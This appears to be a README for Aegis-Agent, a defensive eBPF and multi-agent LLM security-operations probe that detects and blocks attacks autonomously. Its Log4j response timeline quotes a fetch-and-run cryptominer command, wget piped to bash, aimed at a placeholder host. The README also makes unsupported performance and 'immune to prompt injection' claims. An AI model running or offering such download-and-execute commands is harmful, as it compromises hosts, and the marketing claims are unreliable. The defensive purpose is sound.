# 🛡️ Aegis-Agent: Autonomous eBPF & Multi-Agent SOC

![C++20](https://img.shields.io/badge/C++-20-blue.svg) ![eBPF](https://img.shields.io/badge/eBPF-Kernel-black.svg) ![ONNX](https://img.shields.io/badge/AI-ONNX_Runtime-orange.svg) ![MCP](https://img.shields.io/badge/Protocol-MCP-green.svg) ![LLM](https://img.shields.io/badge/LLM-Multi_Agent-purple.svg)

**Aegis-Agent** 是一款面向未来的云原生自动化安全运营中心（Autonomous SOC）探针。它突破了传统安全产品“全量抓包延迟高”、“大模型处理海量流量成本高”以及“AI 容易被提示词注入”的三大痛点，在业界首创性地实现了 **“边缘 AI 纳秒级过滤 + 云端大模型联邦决策”** 的**快慢双系统架构 (System 1 & System 2)**。

---

## 🌟 核心架构理念：快慢思考双系统

Aegis 借鉴了人类大脑的运作模式，横跨 Linux 内核态、用户态与云端大模型，构建了绝对隔离但完美协同的三层防线：

### 1. ⚡ 快系统 (System 1)：eBPF 数据面 & ET-BERT 边缘感知
* **纳秒级底层拦截 (eBPF/XDP)**：利用 Linux 内核的 XDP 技术，在网卡收到光电信号的瞬间执行 BPF 字节码进行查表拦截。即使面对 100Gbps 的 DDoS 洪峰，服务器 CPU 损耗依然趋近于 0%。
* **毫秒级边缘 AI (C++ & ONNX)**：旁路无锁抓取流量，送入预加载的 **ET-BERT** 网络流量大模型进行前向传播推理。无论流量是否被 TLS 加密，均可在 5 毫秒内敏锐嗅探出木马心跳或漏洞利用特征（置信度 > 0.95），并主动向控制面发出告警。

### 2. 🌉 桥接层：高性能 MCP 异步通信网关 (Seastar)
* 放弃了低效的轮询机制，基于无锁协程框架 **Seastar** 实现了标准大模型上下文协议 (**Model Context Protocol, MCP**)。
* 它将底层 C++ 的极其危险的系统调用（读取内核 TCP 表、跨进程读取内存、更新 eBPF Map）安全地包装为 `Tool Schema`，以 JSON-RPC 的形式暴露给大模型。探针是吹哨人，大模型是特警队。

### 3. 🧠 慢系统 (System 2)：Multi-Agent SOC 与 RAG
由 Python 驱动的云端多智能体架构（LLM Agent），充当整个安全系统的“中央司令部”：
* **取证专员 (Investigator)**：收到 C++ 探针的威胁告警后，主动通过 MCP 协议向下穿透，调用 `get_pid_by_connection` 查出发出恶意流量的幕后 PID，再提取其 `cmdline` 和运行特征。
* **安全指挥官 (Commander)**：结合本地 RAG 威胁情报知识库（如 MITRE ATT&CK），对取证报告进行交叉验证与逻辑推理，准确拦截未知 APT 攻击，并输出详尽的溯源报告。
* **免疫 Prompt Injection**：大模型的最终 `BLOCK` 决议不再执行容易被注入的 OS 命令 (`system("iptables")`)，而是直接映射为极其安全的 `bpf_map_update_elem` 内存地址更新，彻底杜绝了大模型幻觉导致服务器被格式化的风险。

---

## 📂 项目模块地图

Aegis 采用了极度解耦的现代工程结构：

```text
aegis-agent/
├── src/                          # C++ Native 核心代码 (编译为 aegis_agent)
│   ├── ebpf/                     # 内核态防线: xdp_filter.c (网卡层 BPF 黑名单过滤)
│   ├── capture/                  # 数据面: libpcap 嗅探器、FlowTracker 重组、Tokenizer 切词
│   ├── inference/                # AI 引擎: ONNX Runtime C++ API (ET-BERT 张量计算)
│   ├── mcp_server/               # 控制面: Seastar 异步协议栈与底层 OS Tools 暴露
│   └── main.cpp                  # 引擎总成: 多核无锁分离调度
├── scripts/                      # AI 大脑控制端
│   └── multi_agent_soc.py        # Python 大模型多智能体 (协同火山引擎 / DeepSeek)
├── waf/                          # [串联防线扩展]
│   └── waf_proxy.py              # 基于 FastAPI + httpx 的流式透明 AI 反向代理
├── third_party/                  # 包含 MCP-Server 框架与局部依赖
├── models/                       # 存放 ET-BERT .onnx 权重及 external data
└── CMakeLists.txt                # C++20 现代构建脚本
```

---

## ⚔️ 终极实战演练：一击必杀的攻击溯源链路

当黑客利用 `Log4j` 漏洞尝试下载挖矿脚本时，Aegis 的自动响应时间轴：

1. **[T+0ms] 边缘感知**：黑客报文到达网卡，被零拷贝送入 C++ ONNX 引擎，打出 `0.99` 极高危评分。
2. **[T+5ms] 异步告警**：C++ MCP Server 构建 JSON-RPC `threat_detected` 通知，瞬间推给 Python Agent。
3. **[T+1s] 内核取证**：Agent 1 接单，下发 MCP 指令查 PID。C++ 瞬间扫描 `/proc/net/tcp`，查到恶意流量的 PID 为 `8901`，其运行命令为 `wget http://x.x/miner.sh -O -> bash`。
4. **[T+3s] 专家研判**：Agent 2（结合 RAG 知识库）比对后认定这是高危无文件后门植入，下发绝杀指令 `<BLOCK_IP>`。
5. **[T+4s] 物理斩杀**：指令抵达 C++ 控制面，调用 `bpf_map_update` 将该 IP 写入网卡 eBPF 芯片。黑客后续所有报文在操作系统之外即灰飞烟灭。
6. **[T+5s] 结案**：大模型生成包含入侵链路、IOC 情报和处置结果的战报。

全程无需人工干预，将传统 SOC 团队的平均响应时间（MTTR）**从 30 分钟压缩至 5 秒钟内**！

---

## 🛠️ 编译与运行指南

### 依赖环境
* Linux (推荐 Ubuntu 24.04+)
* C++20 编译器 (GCC 11+ / Clang 14+)
* `libpcap-dev`, `onnxruntime` (C++ API), `seastar`
* Python 3.12+ 

### 构建底层 C++ 探针
```bash
mkdir build && cd build
cmake ..
make -j4
```

### 启动 Autonomous SOC (大模型大脑)
```bash
# 激活 Python 虚拟环境，设置您的模型 API 密钥 (兼容 OpenAI SDK)
export OPENAI_API_KEY="your-api-key"
export OPENAI_BASE_URL="https://api.deepseek.com" # 或火山引擎等国内接口

# 需要 root 权限以加载 eBPF map 和执行 libpcap 混杂模式嗅探
sudo ./venv/bin/python scripts/multi_agent_soc.py
```

---

